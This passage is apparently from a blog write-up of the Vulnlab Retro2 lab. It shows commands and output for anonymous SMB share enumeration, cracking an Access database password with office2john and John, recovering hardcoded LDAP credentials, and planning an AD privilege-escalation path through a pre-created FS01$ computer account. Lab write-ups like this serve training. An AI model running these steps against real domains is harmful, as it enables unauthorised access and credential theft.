style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 18:07:43 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb $IP -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e / Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 Build \u003cspan style=\"color:#ae81ff\"\u003e7601\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:BLN01\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro2.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro2.vl\u003cspan style=\"color:#ae81ff\"\u003e\\:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Error enumerating shares: STATUS_ACCESS_DENIED\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 18:07:49 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb $IP -u \u0026#39;test\u0026#39; -p \u0026#39;\u0026#39; --shares\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e / Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 Build \u003cspan style=\"color:#ae81ff\"\u003e7601\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:BLN01\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro2.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro2.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003eest: \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eGuest\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Enumerated shares\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            Share           Permissions     Remark\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            -----           -----------     ------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            ADMIN$                          Remote Admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            C$                              Default share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            IPC$                            Remote IPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            NETLOGON                        Logon server share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            Public          READ\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.90.89     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            SYSVOL                          Logon server share\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eSMB null session is enabled, which allows us to read the Public share. In this share, we have an MS Access file.\nAfter trying to open it with MS Access, we can see that it is password protected. Fortunately, there is a tool that allows us to extract the hash of this password and then crack it with John.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 19:00:47 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# python2 office2john.py staff.accdb| tee staff_hash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003estaff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 19:04:48 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# john staff_hash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUsing default input encoding: UTF-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLoaded \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e password hash \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eOffice, 2007/2010/2013 \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eSHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES\u003cspan style=\"color:#f92672\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCost \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eMS Office version\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e is \u003cspan style=\"color:#ae81ff\"\u003e2013\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e all loaded hashes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCost \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eiteration count\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e is \u003cspan style=\"color:#ae81ff\"\u003e100000\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e all loaded hashes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWill run \u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e OpenMP threads\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eProceeding with single, rules:Single\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePress \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;q\u0026#39;\u003c/span\u003e or Ctrl-C to abort, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;h\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e help, almost any other key \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e status\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAlmost \u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e: Processing the remaining buffered candidate passwords, \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e any.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e0g 0:00:01:13 DONE 1/3 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e2025-10-15 19:06\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e 0g/s 192.0p/s 192.0c/s 192.0C/s Sstaff.accdb1902..Astaff1900\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eProceeding with wordlist:/opt/tools/john/run/password.lst\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnabling duplicate candidate password suppressor\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eclass08          \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003estaff.accdb\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e1g 0:00:02:05 DONE 2/3 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e2025-10-15 19:07\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e 0.007968g/s 195.6p/s 195.6c/s 195.6C/s coolkid..love27\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUse the \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;--show\u0026#34;\u003c/span\u003e option to display all of the cracked passwords reliably\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSession completed.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e strLDAP \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;LDAP://OU=staff,DC=retro2,DC=vl\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    strUser \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;retro2\\ldapreader\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    strPassword \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ppYaVcB5R\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003cp\u003eWe now have credentials for the ldapreader user. We will use this user to find a path to become admin with bloodhound.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"blood_2.png\" alt=\"blood_2\"\u003e\u003c/p\u003e\n\u003cp\u003eWe can see that if we can gain access to the FS01$ machine account for example, we can then abuse the GenericWrite ACE to modify the password of the ADMWS01 machine, which will then allow us to abuse AddMember to add the ldapreader user to the SERVICES group, which is a member of the REMOTE DESKTOP USERS group.\u003c/p\u003e\n\u003cp\u003eWith an LDAP query, we can see that the local groups (built-in AD groups) on the domain controller contain the RDP group, which means that if we control the RDP group, we can connect via RDP to the domain controller.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:39:23 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb $IP -u \u0026#39;ldapreader\u0026#39; -p \u0026#39;ppYaVcB5R\u0026#39; --local-groups\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e / Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 Build \u003cspan style=\"color:#ae81ff\"\u003e7601\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:BLN01\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro2.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro2.vl\u003cspan style=\"color:#ae81ff\"\u003e\\l\u003c/span\u003edapreader:ppYaVcB5R\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Enumerating with SAMRPC protocol\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Enumerated local groups\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e549\u003c/span\u003e - Server Operators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e548\u003c/span\u003e - Account Operators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e554\u003c/span\u003e - Pre-Windows \u003cspan style=\"color:#ae81ff\"\u003e2000\u003c/span\u003e Compatible Access\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e557\u003c/span\u003e - Incoming Forest Trust Builders\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e560\u003c/span\u003e - Windows Authorization Access Group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e561\u003c/span\u003e - Terminal Server License Servers\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e544\u003c/span\u003e - Administrators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e545\u003c/span\u003e - Users\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e546\u003c/span\u003e - Guests\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e550\u003c/span\u003e - Print Operators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e551\u003c/span\u003e - Backup Operators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e552\u003c/span\u003e - Replicator\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e555\u003c/span\u003e - Remote Desktop Users\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e556\u003c/span\u003e - Network Configuration Operators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e558\u003c/span\u003e - Performance Monitor Users\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e559\u003c/span\u003e - Performance Log Users\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e562\u003c/span\u003e - Distributed COM Users\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e568\u003c/span\u003e - IIS_IUSRS\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e569\u003c/span\u003e - Cryptographic Operators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e573\u003c/span\u003e - Event Log Readers\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e574\u003c/span\u003e - Certificate Service DCOM Access\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e517\u003c/span\u003e - Cert Publishers\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e553\u003c/span\u003e - RAS and IAS Servers\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e571\u003c/span\u003e - Allowed RODC Password Replication Group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e572\u003c/span\u003e - Denied RODC Password Replication Group\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#ae81ff\"\u003e1102\u003c/span\u003e - DnsAdmins\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eLet\u0026rsquo;s check if we can control the FS01 computer account, and indeed we can see that it has the pre-created computer attribute, which means its password is the machine name in lowercase.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:43:13 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb $IP -u \u0026#39;fs01$\u0026#39; -p \u0026#39;fs01\u0026#39; --shares\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e / Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 Build \u003cspan style=\"color:#ae81ff\"\u003e7601\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:BLN01\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro2.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.109.196   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    BLN01            \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro2.vl\u003cspan style=\"color:#ae81ff\"\u003e\\f\u003c/span\u003es01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe cannot use getTGT to obtain a TGT because we are on a 2008 functional level domain. So we will simply change the password of FS01.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e 